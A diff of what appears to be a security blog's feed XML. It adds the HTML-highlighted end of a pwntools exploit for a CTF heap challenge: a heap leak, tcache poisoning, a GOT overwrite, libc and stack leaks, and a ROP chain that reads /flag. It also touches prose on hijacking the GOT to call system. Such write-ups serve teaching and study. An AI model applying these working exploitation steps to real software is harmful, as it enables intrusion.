+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Write me a book no more than 32 characters long!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Write me the new contents of your book that is no longer than what it was before.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="k">def</span> <span class="nf">heapLeak</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;What is your favourite number? &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;You found a secret message: &#34;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">HEAP_OFFT</span>
+
+    <span class="k">def</span> <span class="nf">enable_print</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+        <span class="n">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+            <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="p">]))</span>
+
+    <span class="k">def</span> <span class="nf">libc_leak_free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">STDOUT</span>
+
+    <span class="k">def</span> <span class="nf">leak_environ</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+    <span class="n">init</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;m&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x41</span><span class="p">))</span>
+
+    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;K&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
+    <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">heapLeak</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># victim</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">,</span>
+                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># prev_sz</span>
+                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake size</span>
+                    <span class="p">]))</span>
+    
+    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">,</span>
+                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># prev_sz</span>
+                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake size</span>
+                    <span class="p">]))</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># count for 0x40 tcachebin = 1</span>
+
+    <span class="c1"># chunk2 =&gt; sz extended</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;K&#34;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
+    <span class="c1"># chunk2 =&gt; tcachebin 0x40, count = 2</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="c1"># oob write over chunk3, we keep valid header</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span>
+                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># valid size to end up in the 0x40 tcache bin</span>
+                    <span class="p">]))</span> <span class="c1"># count = 1</span>
+
+    <span class="c1"># chunk3 =&gt; 0x40 tcachebin, count = 2</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Encrypted fp: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">encode_ptr</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">CHUNK3_OFFT</span><span class="p">,</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">printf</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># tcache poisoning</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span>
+                         <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">),</span> <span class="c1"># valid size</span>
+                         <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">encode_ptr</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">CHUNK3_OFFT</span><span class="p">,</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span><span class="p">))</span> <span class="c1"># forward ptr</span>
+                     <span class="p">]))</span>
+
+    <span class="c1"># dumb</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># count = 1</span>
+
+    <span class="c1"># arbitrary write to @books, this way books[1] is user controlled</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">),</span> <span class="c1"># sz</span>
+        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span><span class="p">),</span> <span class="c1"># target</span>
+        <span class="sa">b</span><span class="s2">&#34;P&#34;</span><span class="o">*</span><span class="mh">0x10</span>
+    <span class="p">]))</span> <span class="c1"># count = 0</span>
+
+    <span class="c1"># we can write way more due to the previous call</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+            <span class="c1"># 1==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="c1"># target</span>
+            <span class="c1"># 2==</span>
+            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">,</span> <span class="c1"># target</span>
+            <span class="c1"># 3==</span>
+            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">secret_msg</span><span class="p">,</span> <span class="c1"># target</span>
+            <span class="c1"># 4==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span> <span class="c1"># target</span>
+        <span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+    
+    <span class="c1"># free@got =&gt; puts</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+            <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
+        <span class="p">]))</span>
+    
+    <span class="c1"># can print = true</span>
+    <span class="n">enable_print</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+    <span class="c1"># libc leak</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># leak stack (environ)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+            <span class="c1"># 1==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="c1"># target</span>
+        <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+    <span class="n">environ</span> <span class="o">=</span> <span class="n">leak_environ</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="n">stackframe_rewrite</span> <span class="o">=</span> <span class="n">environ</span> <span class="o">-</span> <span class="mh">0x150</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stackframe_rewrite: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stackframe_rewrite</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="n">stackframe_rewrite</span><span class="p">)</span>
+
+    <span class="c1"># setup the write to the rewrite stackframe</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
+            <span class="c1"># 1==</span>
+            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
+            <span class="n">stackframe_rewrite</span> <span class="c1"># target</span>
+        <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+    <span class="c1"># ROPchain</span>
+    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_open</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="n">stackframe_rewrite</span> <span class="o">+</span> <span class="mh">0xde</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span> <span class="c1"># open</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># file descriptor bf ...</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+
+    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># write</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
+    <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+
+    <span class="c1"># write and trigger the ROPchain</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+    
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</code></pre></div>]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
+                             
+                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
+                             
+                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         
         <entry>
             <title type="html"><![CDATA[[HackTM finals 2023 - pwn] cs2101]]></title>
@@ -1057,7 +1817,7 @@ For bug reporting instructions, please see:
         </a>
     </h2>
 </div>
-<p>Given tcache poisoning seems to be pretty easy to achieve, we need to find were use our arbitrary write. If you remind well, the binary isn&rsquo;t PIE and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
+<p>Given tcache poisoning seems to be pretty easy to achieve, we need to find where we could use our arbitrary write. If you remind well, the binary isn&rsquo;t PIE based and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
 <div class="gblog-post__anchorwrap">
     <h3 id="libc-leak">
         libc leak
